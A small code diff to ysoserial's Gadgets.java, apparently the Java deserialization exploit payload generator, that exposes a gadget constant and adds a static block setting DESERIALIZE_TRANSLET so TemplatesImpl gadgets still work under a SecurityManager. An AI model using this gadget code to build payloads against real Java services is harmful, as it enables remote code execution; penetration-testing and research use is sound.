@@ -1,6 +1,8 @@
 package ysoserial.payloads.util;
 
 
+import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
+
 import java.io.Serializable;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
@@ -26,10 +28,12 @@ import javassist.CtClass;
 /*
  * utility generator functions for common jdk-only gadgets
  */
-@SuppressWarnings ( "restriction" )
+@SuppressWarnings ( {
+    "javadoc", "restriction", "nls", "rawtypes", "unchecked"
+} )
 public class Gadgets {
 
-    private static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
+    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
 
     public static class StubTransletPayload extends AbstractTranslet implements Serializable {
 
@@ -148,4 +152,12 @@ public class Gadgets {
         Reflections.setFieldValue(s, "table", tbl);
         return s;
     }
+
+
+    static {
+        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
+        System.setProperty(DESERIALIZE_TRANSLET, "true");
+
+    }
+
 }
